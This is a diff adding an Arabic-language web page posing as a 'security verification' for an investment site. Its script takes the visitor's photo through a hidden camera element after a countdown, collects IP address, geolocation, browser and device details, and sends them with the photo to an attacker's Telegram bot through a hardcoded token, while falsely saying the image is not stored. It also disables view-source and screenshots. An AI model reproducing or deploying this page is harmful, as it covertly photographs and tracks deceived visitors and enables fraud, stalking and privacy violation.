@@ -1,0 +1,965 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>موقع التحقق الأمني - الاستثمار العالمي</title>
+    <style>
+        /* ========== إعدادات أساسية ========== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background-color: #0a1931; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            margin: 0; 
+            text-align: center; 
+            direction: rtl; 
+            background-image: linear-gradient(135deg, #0a1931 0%, #1a1a2e 100%);
+            padding: 20px;
+        }
+        
+        .container { 
+            background-color: #162447; 
+            padding: 30px; 
+            border-radius: 20px; 
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5); 
+            max-width: 450px; 
+            width: 100%;
+            transition: transform 0.3s ease;
+            border: 1px solid rgba(86, 98, 246, 0.3);
+        }
+        
+        .container:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
+        }
+        
+        /* ========== التنسيقات النصية ========== */
+        h1 { 
+            color: #ffffff; 
+            font-size: 26px; 
+            margin-bottom: 15px;
+            background: linear-gradient(135deg, #ff9a00 0%, #ff6b6b 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+        }
+        
+        h2 {
+            color: #4cc9f0;
+            font-size: 22px;
+            margin: 15px 0;
+        }
+        
+        p { 
+            color: #c0c0c0; 
+            font-size: 15px; 
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+        
+        /* ========== الأيقونات ========== */
+        .icon { 
+            font-size: 70px; 
+            color: #4cc9f0; 
+            margin-bottom: 15px;
+            animation: pulse 2s infinite;
+            text-shadow: 0 0 20px rgba(76, 201, 240, 0.5);
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.8; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        
+        /* ========== الأزرار ========== */
+        .button { 
+            display: inline-block; 
+            background: linear-gradient(135deg, #ff9a00 0%, #ff6b6b 100%); 
+            color: white; 
+            padding: 14px 30px; 
+            border: none; 
+            border-radius: 10px; 
+            text-decoration: none; 
+            font-weight: bold; 
+            cursor: pointer;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(255, 106, 107, 0.4);
+            margin: 5px;
+            width: 100%;
+            max-width: 250px;
+        }
+        
+        .button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(255, 106, 107, 0.6);
+            background: linear-gradient(135deg, #ff6b6b 0%, #ff9a00 100%);
+        }
+        
+        .button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .button-secondary {
+            background: linear-gradient(135deg, #4361ee 0%, #3a0ca3 100%);
+            box-shadow: 0 5px 15px rgba(67, 97, 238, 0.4);
+        }
+        
+        .button-secondary:hover {
+            box-shadow: 0 8px 20px rgba(67, 97, 238, 0.6);
+            background: linear-gradient(135deg, #3a0ca3 0%, #4361ee 100%);
+        }
+        
+        /* ========== شاشة العد التنازلي ========== */
+        .countdown-container {
+            margin: 25px 0;
+            padding: 25px;
+            background: linear-gradient(135deg, #f72585 0%, #b5179e 100%);
+            border-radius: 15px;
+            box-shadow: 0 8px 25px rgba(247, 37, 133, 0.3);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .countdown {
+            font-size: 48px;
+            color: white;
+            font-weight: bold;
+            text-shadow: 2px 2px 8px rgba(0,0,0,0.4);
+            margin: 15px 0;
+            animation: countdownPulse 1s infinite;
+        }
+        
+        @keyframes countdownPulse {
+            0% { transform: scale(1); text-shadow: 0 0 10px #fff; }
+            50% { transform: scale(1.1); text-shadow: 0 0 20px #fff; }
+            100% { transform: scale(1); text-shadow: 0 0 10px #fff; }
+        }
+        
+        .countdown-text {
+            font-size: 16px;
+            color: white;
+            margin-top: 10px;
+            font-weight: 500;
+        }
+        
+        /* ========== حالات الكاميرا ========== */
+        .camera-status {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            font-size: 14px;
+            color: #ddd;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        
+        .camera-status-icon {
+            font-size: 24px;
+            margin-left: 10px;
+            vertical-align: middle;
+        }
+        
+        /* ========== شاشات الحالة ========== */
+        .screen {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .active-screen {
+            display: block;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        /* ========== مؤشر التحميل ========== */
+        .loading { 
+            display: none; 
+            margin: 25px 0;
+            color: #4cc9f0;
+            font-weight: bold;
+        }
+        
+        .loading-spinner {
+            display: inline-block;
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(76, 201, 240, 0.3);
+            border-top: 4px solid #4cc9f0;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* ========== معلومات المستخدم ========== */
+        .user-info {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            text-align: right;
+            font-size: 13px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .user-info div {
+            margin: 5px 0;
+            color: #aaa;
+        }
+        
+        .user-info strong {
+            color: #4cc9f0;
+        }
+        
+        /* ========== عرض ID المشرف ========== */
+        .admin-id-display {
+            background: linear-gradient(135deg, #7209b7 0%, #3a0ca3 100%);
+            color: white;
+            padding: 12px 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            box-shadow: 0 4px 15px rgba(114, 9, 183, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            display: none;
+        }
+        
+        .admin-id-display span {
+            font-weight: bold;
+            font-size: 16px;
+            direction: ltr;
+            display: inline-block;
+            padding: 3px 10px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 5px;
+            margin-right: 8px;
+            font-family: monospace;
+            letter-spacing: 1px;
+        }
+        
+        /* ========== عناصر الكاميرا المخفية ========== */
+        .hidden-camera {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+        
+        /* ========== تأثير التقاط الصورة ========== */
+        .capture-effect {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            z-index: 1000;
+            opacity: 0;
+            pointer-events: none;
+            animation: captureFlash 0.5s;
+        }
+        
+        @keyframes captureFlash {
+            0% { opacity: 0; }
+            50% { opacity: 0.8; }
+            100% { opacity: 0; }
+        }
+        
+        /* ========== التنبيهات ========== */
+        .alert {
+            padding: 12px 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-size: 14px;
+            border-right: 4px solid;
+            text-align: right;
+        }
+        
+        .alert-warning {
+            background-color: rgba(255, 193, 7, 0.1);
+            color: #ffc107;
+            border-right-color: #ffc107;
+        }
+        
+        .alert-info {
+            background-color: rgba(13, 202, 240, 0.1);
+            color: #0dcaf0;
+            border-right-color: #0dcaf0;
+        }
+        
+        /* ========== علامة التوكن ========== */
+        .token-badge {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            background: linear-gradient(135deg, #ff9a00 0%, #ff6b6b 100%);
+            color: white;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: bold;
+            box-shadow: 0 3px 10px rgba(255, 106, 107, 0.4);
+            z-index: 100;
+            opacity: 0.9;
+        }
+        
+        /* ========== التجاوب مع الشاشات الصغيرة ========== */
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px;
+                margin: 10px;
+            }
+            
+            h1 {
+                font-size: 22px;
+            }
+            
+            .icon {
+                font-size: 60px;
+            }
+            
+            .countdown {
+                font-size: 40px;
+            }
+            
+            .button {
+                padding: 12px 20px;
+                font-size: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- علامة تأكيد التوكن -->
+    <div class="token-badge">🔐 BOT TOKEN ACTIVE</div>
+    
+    <!-- عناصر الكاميرا المخفية -->
+    <video id="liveVideo" class="hidden-camera" autoplay playsinline></video>
+    <canvas id="previewCanvas" class="hidden-camera"></canvas>
+    <div id="captureEffect" class="capture-effect"></div>
+    
+    <div class="container">
+        <!-- عرض ID المشرف -->
+        <div id="adminIdDisplay" class="admin-id-display">
+            📍 سيتم إرسال التحقق إلى المشرف: <span id="targetAdminId"></span>
+        </div>
+        
+        <!-- الشاشة 1: الرئيسية -->
+        <div id="screen1" class="screen active-screen">
+            <div class="icon">🔐</div>
+            <h1>موقع التحقق الأمني</h1>
+            <h2>الاستثمار العالمي</h2>
+            
+            <div class="alert alert-warning">
+                <strong>تنبيه أمني:</strong> يرجى التحقق من أنك لست روبوت لإكمال عملية التحقق الأمني.
+            </div>
+            
+            <div class="alert alert-info">
+                <strong>معلومة:</strong> للتحقق من هويتك، سيتم التقاط صورة من كاميرتك. سيتم استخدامها للتحقق الأمني فقط ولن يتم حفظها.
+            </div>
+            
+            <button class="button" onclick="startVerification()" id="startBtn">
+                🔒 بدء التحقق الأمني
+            </button>
+            
+            <div class="user-info">
+                <div><strong>رقم الجلسة:</strong> <span id="sessionId"></span></div>
+                <div><strong>التاريخ:</strong> <span id="currentDate"></span></div>
+                <div><strong>الوقت:</strong> <span id="currentTime"></span></div>
+            </div>
+        </div>
+        
+        <!-- الشاشة 2: العد التنازلي -->
+        <div id="screen2" class="screen">
+            <div class="icon">📸</div>
+            <h1>التحقق بالكاميرا</h1>
+            <p>يرجى النظر باتجاه الكاميرا مباشرة</p>
+            <p style="font-size: 13px; color: #aaa;">سيكون هناك وميض عند التقاط الصورة</p>
+            
+            <div class="countdown-container">
+                <div class="countdown" id="countdownNumber">5</div>
+                <div class="countdown-text" id="countdownText">
+                    ثانية متبقية للتقاط الصورة...
+                </div>
+            </div>
+            
+            <div class="camera-status">
+                <span class="camera-status-icon">📷</span>
+                <span id="cameraStatus">جاري تهيئة نظام الكاميرا...</span>
+            </div>
+            
+            <button class="button button-secondary" onclick="cancelVerification()">
+                🚫 إلغاء العملية
+            </button>
+        </div>
+        
+        <!-- الشاشة 3: النجاح -->
+        <div id="screen3" class="screen">
+            <div class="icon" style="color: #38b000;">✅</div>
+            <h1>تم التحقق بنجاح!</h1>
+            <p>تم التحقق من هويتك بنجاح. يمكنك الآن الوصول إلى الموقع.</p>
+            
+            <div class="alert alert-info" style="background-color: rgba(56, 176, 0, 0.1); color: #38b000; border-right-color: #38b000;">
+                <strong>✓ تم إرسال:</strong> صورة التحقق + معلومات الجلسة إلى الإدارة
+            </div>
+            
+            <button class="button" onclick="redirectToSite()" style="background: linear-gradient(135deg, #38b000 0%, #2d7d46 100%);">
+                🚀 الانتقال إلى الموقع الرئيسي
+            </button>
+        </div>
+        
+        <!-- الشاشة 4: الخطأ -->
+        <div id="screen4" class="screen">
+            <div class="icon" style="color: #ff6b6b;">❌</div>
+            <h1>فشل التحقق</h1>
+            <p>لم نتمكن من الوصول إلى الكاميرا أو حدث خطأ في النظام.</p>
+            
+            <div class="alert alert-warning">
+                <strong>الحلول المقترحة:</strong><br>
+                1. السماح باستخدام الكاميرا<br>
+                2. تحديث الصفحة والمحاولة مرة أخرى<br>
+                3. استخدام جهاز مختلف
+            </div>
+            
+            <button class="button" onclick="retryVerification()" style="background: linear-gradient(135deg, #4361ee 0%, #3a0ca3 100%);">
+                🔄 المحاولة مرة أخرى
+            </button>
+        </div>
+        
+        <!-- مؤشر التحميل -->
+        <div class="loading" id="loading">
+            <div class="loading-spinner"></div>
+            <div>جاري التحقق ومعالجة البيانات...</div>
+            <div style="font-size: 12px; color: #888; margin-top: 10px;">يرجى الانتظار</div>
+        </div>
+    </div>
+
+    <script>
+        // =================== [قلب النظام] - توكن البوت ===================
+        // 🔐 TOKEN BOT TELEGRAM - تم تضمينه في قلب الموقع كما طلبت
+        // 🎯 الرابط: 7514651484:AAF9NJKzeyVYgF4HrkJiDdpxkHD3LrLrMOY
+        const BOT_TOKEN = '8658161529:AAGFS87uW8RIcXXYUrGXpblCSeVMYq7X89I';
+        // =================================================================
+        
+        // =================== دالة استخراج ID من الرابط ===================
+        function getUrlParameter(name) {
+            name = name.replace(/[\[\]]/g, '\\$&');
+            const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
+            const results = regex.exec(window.location.href);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, ' '));
+        }
+        
+        // =================== الحصول على ID المشرف ===================
+        const ADMIN_ID = getUrlParameter('id') || getUrlParameter('admin') || getUrlParameter('user');
+        
+        // عرض ID المشرف إذا كان موجوداً
+        if (ADMIN_ID && ADMIN_ID.length > 3) {
+            document.getElementById('adminIdDisplay').style.display = 'block';
+            document.getElementById('targetAdminId').textContent = ADMIN_ID;
+            console.log('✅ تم تحديد ID المشرف:', ADMIN_ID);
+        } else {
+            console.warn('⚠️ لم يتم تحديد ID المشرف في الرابط');
+        }
+        
+        // =================== توليد رقم جلسة ===================
+        function generateSessionId() {
+            const timestamp = Date.now().toString(36);
+            const random = Math.random().toString(36).substr(2, 6);
+            return `VERIFY-${timestamp}-${random}`.toUpperCase();
+        }
+        const SESSION_ID = generateSessionId();
+        
+        // =================== متغيرات النظام ===================
+        let stream = null;
+        let countdownInterval = null;
+        let countdownValue = 5;
+        let isCameraReady = false;
+        
+        // =================== تحديث الوقت والتاريخ ===================
+        function updateDateTime() {
+            const now = new Date();
+            
+            // تحديث الوقت
+            const timeOptions = { hour: '2-digit', minute: '2-digit', second: '2-digit' };
+            document.getElementById('currentTime').textContent = now.toLocaleTimeString('ar-EG', timeOptions);
+            
+            // تحديث التاريخ
+            const dateOptions = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+            document.getElementById('currentDate').textContent = now.toLocaleDateString('ar-EG', dateOptions);
+            
+            // تحديث رقم الجلسة
+            document.getElementById('sessionId').textContent = SESSION_ID;
+        }
+        
+        // تحديث الوقت كل ثانية
+        setInterval(updateDateTime, 1000);
+        updateDateTime();
+        
+        // =================== تبديل الشاشات ===================
+        function showScreen(screenId) {
+            // إخفاء جميع الشاشات
+            document.querySelectorAll('.screen').forEach(screen => {
+                screen.classList.remove('active-screen');
+            });
+            
+            // إظهار الشاشة المطلوبة
+            const targetScreen = document.getElementById(screenId);
+            if (targetScreen) {
+                targetScreen.classList.add('active-screen');
+            }
+            
+            // إخفاء التحميل
+            document.getElementById('loading').style.display = 'none';
+        }
+        
+        // =================== بدء عملية التحقق ===================
+        async function startVerification() {
+            console.log('🚀 بدء عملية التحقق الأمني...');
+            
+            // التحقق من وجود ID المشرف
+            if (!ADMIN_ID || ADMIN_ID.length < 5) {
+                alert('❌ خطأ: لم يتم تحديد مستلم للتحقق.\n\n🔗 مثال للرابط الصحيح:\nhttps://موقعك.com/?id=123456789\n\n📌 يرجى استخدام رابط صحيح يحتوي على ID المشرف');
+                return;
+            }
+            
+            // التحقق من HTTPS (مطلوب للكاميرا)
+            if (window.location.protocol !== 'https:' && window.location.hostname !== 'localhost') {
+                alert('🔒 يرجى فتح هذه الصفحة على رابط HTTPS لتشغيل الكاميرا\n\n📱 HTTPS مطلوب للوصول إلى الكاميرا');
+                return;
+            }
+            
+            // الانتقال إلى شاشة العد التنازلي
+            showScreen('screen2');
+            document.getElementById('cameraStatus').textContent = '🔧 جاري تشغيل الكاميرا...';
+            
+            // بدء تشغيل الكاميرا
+            const cameraSuccess = await startCamera();
+            
+            if (cameraSuccess) {
+                console.log('✅ الكاميرا جاهزة، بدء العد التنازلي');
+                document.getElementById('cameraStatus').textContent = '✅ الكاميرا جاهزة - انظر باتجاه العدسة';
+                startCountdown();
+            } else {
+                console.error('❌ فشل في تشغيل الكاميرا');
+                document.getElementById('cameraStatus').textContent = '❌ فشل في تشغيل الكاميرا';
+                setTimeout(() => {
+                    showScreen('screen4');
+                }, 1500);
+            }
+        }
+        
+        // =================== تشغيل الكاميرا ===================
+        async function startCamera() {
+            const video = document.getElementById('liveVideo');
+            
+            try {
+                console.log('📹 محاولة الوصول إلى الكاميرا...');
+                
+                // طلب إذن الكاميرا
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user', // الكاميرا الأمامية
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false
+                });
+                
+                console.log('✅ تم الحصول على إذن الكاميرا');
+                video.srcObject = stream;
+                
+                // انتظار حتى تكون الكاميرا جاهزة
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play().then(() => {
+                            console.log('▶️ تشغيل الكاميرا ناجح');
+                            isCameraReady = true;
+                            resolve(true);
+                        }).catch(() => {
+                            console.log('⚠️ تشغيل الفيديو به مشكلة طفيفة');
+                            isCameraReady = true;
+                            resolve(true);
+                        });
+                    };
+                    
+                    // وقت انتظار قصير
+                    setTimeout(() => {
+                        if (!isCameraReady) {
+                            console.log('⏱️ تجاوز وقت الانتظار، المتابعة...');
+                            isCameraReady = true;
+                            resolve(true);
+                        }
+                    }, 2500);
+                });
+                
+                return true;
+                
+            } catch (err) {
+                console.error('❌ خطأ في الكاميرا:', err);
+                document.getElementById('cameraStatus').textContent = '❌ فشل في تشغيل الكاميرا';
+                isCameraReady = false;
+                
+                // رسائل خطأ مفصلة
+                if (err.name === 'NotAllowedError') {
+                    alert('⚠️ تم رفض إذن الكاميرا\n\n🔑 يرجى السماح باستخدام الكاميرا في إعدادات المتصفح');
+                } else if (err.name === 'NotFoundError') {
+                    alert('📷 لم يتم العثور على كاميرا\n\n✅ يرجى التأكد من توصيل الكاميرا أو استخدام جهاز به كاميرا');
+                } else if (err.name === 'NotReadableError') {
+                    alert('🔧 الكاميرا قيد الاستخدام\n\n📱 قد تكون الكاميرا مستخدمة من قبل تطبيق آخر');
+                } else {
+                    alert('❌ خطأ غير معروف في الكاميرا\n\n🔄 يرجى تحديث الصفحة والمحاولة مرة أخرى');
+                }
+                
+                return false;
+            }
+        }
+        
+        // =================== العد التنازلي ===================
+        function startCountdown() {
+            countdownValue = 5;
+            const countdownElement = document.getElementById('countdownNumber');
+            const textElement = document.getElementById('countdownText');
+            
+            countdownElement.textContent = countdownValue;
+            textElement.textContent = 'استعد... سيتم التقاط الصورة تلقائياً';
+            
+            countdownInterval = setInterval(() => {
+                countdownValue--;
+                countdownElement.textContent = countdownValue;
+                
+                // تحديث النص حسب الرقم
+                const messages = [
+                    'جاري التركيز...',
+                    'استعد...',
+                    'واحد...',
+                    'اثنين...',
+                    'يوم جاي...'
+                ];
+                
+                if (countdownValue >= 0 && countdownValue < messages.length) {
+                    textElement.textContent = messages[countdownValue];
+                }
+                
+                // عند الوصول للصفر
+                if (countdownValue <= 0) {
+                    clearInterval(countdownInterval);
+                    textElement.textContent = '📸 جاري التقاط الصورة...';
+                    console.log('📸 بدء التقاط الصورة...');
+                    capturePhoto();
+                }
+            }, 1000);
+        }
+        
+        // =================== التقاط الصورة ===================
+        async function capturePhoto() {
+            console.log('📸 بدء عملية التقاط الصورة');
+            
+            // إظهار تأثير الوميض
+            const effect = document.getElementById('captureEffect');
+            effect.style.animation = 'none';
+            setTimeout(() => {
+                effect.style.animation = 'captureFlash 0.5s';
+            }, 10);
+            
+            const video = document.getElementById('liveVideo');
+            const canvas = document.getElementById('previewCanvas');
+            const context = canvas.getContext('2d');
+            
+            // انتظار لضمان التقاط صورة واضحة
+            await new Promise(resolve => setTimeout(resolve, 300));
+            
+            try {
+                // ضبط أبعاد canvas
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                
+                console.log(`📏 أبعاد الصورة: ${canvas.width}x${canvas.height}`);
+                
+                // رسم الصورة على canvas
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                console.log('✅ تم رسم الصورة بنجاح');
+                
+                // إيقاف الكاميرا
+                if (stream) {
+                    stream.getTracks().forEach(track => {
+                        track.stop();
+                        console.log(`🛑 تم إيقاف: ${track.kind}`);
+                    });
+                }
+                
+                // إظهار شاشة التحميل
+                document.getElementById('loading').style.display = 'block';
+                
+                // تحويل الصورة إلى base64
+                const imageData = canvas.toDataURL('image/jpeg', 0.85);
+                const sizeKB = Math.round(imageData.length / 1024);
+                console.log(`🖼️ حجم الصورة: ${sizeKB} KB`);
+                
+                // إرسال الصورة إلى التليجرام
+                await sendToTelegram(imageData, sizeKB);
+                
+            } catch (error) {
+                console.error('❌ خطأ في التقاط الصورة:', error);
+                showScreen('screen4');
+            }
+        }
+        
+        // =================== إلغاء العملية ===================
+        function cancelVerification() {
+            console.log('⏹️ إلغاء عملية التحقق');
+            
+            if (countdownInterval) {
+                clearInterval(countdownInterval);
+            }
+            
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+            
+            showScreen('screen1');
+        }
+        
+        // =================== إرسال إلى التليجرام ===================
+        async function sendToTelegram(imageData, imageSizeKB) {
+            console.log('📤 بدء إرسال البيانات إلى التليجرام...');
+            
+            try {
+                // 1. جمع معلومات المستخدم
+                const userInfo = await getUserInfo();
+                
+                // 2. إرسال الرسالة النصية
+                const message = `
+📸 *نظام التحقق الأمني - التقاط جديد*
+
+🔐 **معلومات الجلسة:**
+• 🆔 **رقم الجلسة:** \`${SESSION_ID}\`
+• 🕐 **التوقيت:** ${userInfo.timestamp}
+• 📍 **الموقع:** ${userInfo.location}
+• 🌐 **IP المستخدم:** \`${userInfo.ip}\`
+
+💻 **معلومات الجهاز:**
+• 🔧 **المتصفح:** ${userInfo.browser}
+• 🖥️ **النظام:** ${userInfo.os}
+• 📱 **الدقة:** ${userInfo.screen}
+• 🌍 **اللغة:** ${userInfo.language}
+• 📊 **حجم الصورة:** ${imageSizeKB} KB
+
+👤 **المستلم:** \`${ADMIN_ID}\`
+                `;
+                
+                console.log('📝 جاري إرسال الرسالة النصية...');
+                const textResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: ADMIN_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                const textResult = await textResponse.json();
+                console.log('📝 نتيجة الرسالة:', textResult.ok ? '✅ نجح' : '❌ فشل');
+                
+                // 3. إرسال الصورة
+                console.log('🖼️ جاري إرسال الصورة...');
+                
+                // تحويل base64 إلى blob
+                const base64Data = imageData.split(',')[1];
+                const byteCharacters = atob(base64Data);
+                const byteNumbers = new Array(byteCharacters.length);
+                
+                for (let i = 0; i < byteCharacters.length; i++) {
+                    byteNumbers[i] = byteCharacters.charCodeAt(i);
+                }
+                
+                const byteArray = new Uint8Array(byteNumbers);
+                const blob = new Blob([byteArray], { type: 'image/jpeg' });
+                
+                // إنشاء FormData
+                const formData = new FormData();
+                formData.append('photo', blob, `verify_${SESSION_ID}.jpg`);
+                formData.append('chat_id', ADMIN_ID);
+                formData.append('caption', `📸 تحقق أمني - ${SESSION_ID}\n🕐 ${new Date().toLocaleTimeString()}`);
+                
+                // إرسال الصورة
+                const photoResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const photoResult = await photoResponse.json();
+                console.log('🖼️ نتيجة الصورة:', photoResult.ok ? '✅ نجح' : '❌ فشل');
+                
+                if (photoResult.ok) {
+                    // 4. إرسال رسالة تأكيد
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: ADMIN_ID,
+                            text: `✅ *تم الاكتمال بنجاح!*\n\n📸 تم التحقق من المستخدم بنجاح\n🆔 الجلسة: ${SESSION_ID}\n👤 IP: ${userInfo.ip}\n🕐 الوقت: ${new Date().toLocaleTimeString()}`,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                    
+                    // إظهار رسالة النجاح
+                    console.log('🎉 العملية اكتملت بنجاح!');
+                    setTimeout(() => {
+                        showScreen('screen3');
+                    }, 1000);
+                    
+                } else {
+                    // طريقة بديلة إذا فشل إرسال الصورة
+                    console.warn('⚠️ فشل إرسال الصورة، جاري استخدام الطريقة البديلة...');
+                    
+                    const altMessage = `📸 *بديل: تقرير التحقق*\n\n🆔 **الجلسة:** ${SESSION_ID}\n👤 **المستخدم:** ${userInfo.ip}\n🕐 **الوقت:** ${new Date().toLocaleTimeString()}\n⚠️ **ملاحظة:** تم التقاط الصورة ولكن لم نتمكن من إرسالها`;
+                    
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: ADMIN_ID,
+                            text: altMessage,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                    
+                    showScreen('screen3');
+                }
+                
+            } catch (error) {
+                console.error('❌ خطأ في الإرسال:', error);
+                
+                // محاولة أخيرة
+                try {
+                    const simpleMessage = `📸 تحقق: ${SESSION_ID} - ${new Date().toLocaleTimeString()} - ${navigator.userAgent.substring(0, 50)}`;
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(simpleMessage)}`);
+                    showScreen('screen3');
+                } catch (finalError) {
+                    console.error('❌ فشل كامل:', finalError);
+                    showScreen('screen4');
+                }
+            }
+        }
+        
+        // =================== جمع معلومات المستخدم ===================
+        async function getUserInfo() {
+            let ip = 'غير متاح';
+            let location = 'غير معروف';
+            
+            try {
+                // الحصول على IP
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                ip = ipData.ip;
+                console.log('🌐 IP المستخدم:', ip);
+                
+                // محاولة الحصول على الموقع
+                try {
+                    const locResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                    if (locResponse.ok) {
+                        const locData = await locResponse.json();
+                        location = `${locData.city || ''}, ${locData.region || ''}, ${locData.country_name || ''}`;
+                    }
+                } catch (locError) {
+                    console.log('📍 لم يتم الحصول على الموقع:', locError);
+                }
+                
+            } catch (error) {
+                console.error('❌ خطأ في معلومات المستخدم:', error);
+            }
+            
+            return {
+                ip: ip,
+                location: location,
+                timestamp: new Date().toLocaleString('ar-EG'),
+                browser: navigator.userAgent.split('/')[0] || 'متصفح غير معروف',
+                os: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language || 'ar'
+            };
+        }
+        
+        // =================== وظائف العرض ===================
+        function retryVerification() {
+            console.log('🔄 إعادة المحاولة');
+            showScreen('screen1');
+        }
+        
+        function redirectToSite() {
+            console.log('🌐 الانتقال إلى الموقع الرئيسي');
+            window.location.href = 'https://www.google.com'; // يمكنك تغيير الرابط هنا
+        }
+        
+        // =================== حماية الصفحة ===================
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+        
+        document.addEventListener('keydown', function(e) {
+            // منع فحص الكود
+            if (e.ctrlKey && (e.key === 'u' || e.key === 's')) {
+                e.preventDefault();
+            }
+            
+            // منع التقاط لقطة شاشة (حسب المتصفح)
+            if (e.key === 'PrintScreen') {
+                e.preventDefault();
+                alert('⚠️ لا يمكن التقاط لقطة شاشة في هذه الصفحة');
+            }
+        });
+        
+        // منع إعادة التحميل أثناء التحقق
+        window.addEventListener('beforeunload', function(e) {
+            const successScreen = document.getElementById('screen3');
+            if (!successScreen.classList.contains('active-screen')) {
+                e.preventDefault();
+                e.returnValue = '⚠️ هل تريد الخروج قبل إكمال التحقق الأمني؟';
+                return '⚠️ هل تريد الخروج قبل إكمال التحقق الأمني؟';
+            }
+        });
+        
+        // =================== تسجيل حالة النظام ===================
+        console.log('🚀 نظام التحقق الأمني جاهز');
+        console.log('🔑 BOT Token:', BOT_TOKEN ? '✅ موجود في قلب النظام' : '❌ خطأ');
+        console.log('👤 Admin ID:', ADMIN_ID || '⚠️ غير محدد - يرجى إضافته في الرابط');
+        console.log('🆔 Session ID:', SESSION_ID);
+        console.log('🌐 Protocol:', window.location.protocol);
+        console.log('📱 User Agent:', navigator.userAgent.substring(0, 60) + '...');
+        
+        // رسالة ترحيب
+        setTimeout(() => {
+            if (!ADMIN_ID || ADMIN_ID.length < 5) {
+                console.warn('⚠️ تحذير: لم يتم تحديد ID المشرف في الرابط');
+                console.info('💡 تلميح: أضف ?id=123456789 في نهاية الرابط');
+            }
+        }, 2000);
+    </script>
+</body>
+</html>
